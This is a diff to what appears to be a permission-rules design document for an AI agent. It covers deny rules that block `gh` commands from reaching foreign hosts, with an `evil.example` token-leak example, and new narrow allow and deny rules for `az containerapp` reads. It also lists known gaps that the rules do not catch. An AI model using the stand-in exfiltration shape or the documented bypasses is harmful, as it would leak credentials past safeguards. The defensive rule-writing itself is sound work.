@@ -3774,3 +3774,10 @@ secrets, the `read`/`grep`/`glob` tools' resource (the shell replay cannot exerc
 `gh -R evil.example/o/r ...` or a foreign-host URL would send gh's request (and token) to that host. Denied for every `gh` shape: `-R`/`--repo` in any host form (`HOST/OWNER/REPO`, a dot before the first slash, `@`),
 and, for the read and merge shapes, any `://` or `@` argument and `gh api http*`; for the comment/close/edit shapes a URL in first (selector) position. `-R OWNER/REPO` stays allowed. A URL
 inside free text, or a selector URL placed after flags in a comment/close/edit command, is not caught (documented residual; the message commands must keep their text).
+
+### az containerapp reads (#105 follow-up)
+
+Allowed for the Chief of Staff, exactly: `az containerapp show *`, `list *`, `revision list *`. The earlier blanket `az containerapp*` deny (added when `show` was suspected of
+returning secrets) is replaced by narrow denies: `env`, `exec`, `up`, `logs`, `revision restart`, `ingress`, `registry`, `secret` (the word guard), and every write verb. `az containerapp env show|list` stays denied
+(it was the blanket deny, not a bug in the env rule: those two are in the allow list but the blanket won). `containerapp logs show` is covered by no allow rule and is denied.
+`show` returns plain environment variable VALUES (secrets appear only as `secretRef` names, not values; registry passwords are not returned), the same exposure as the allowed `az webapp show`; `--query`, `-q`, `-o` forms and secret words stay denied.
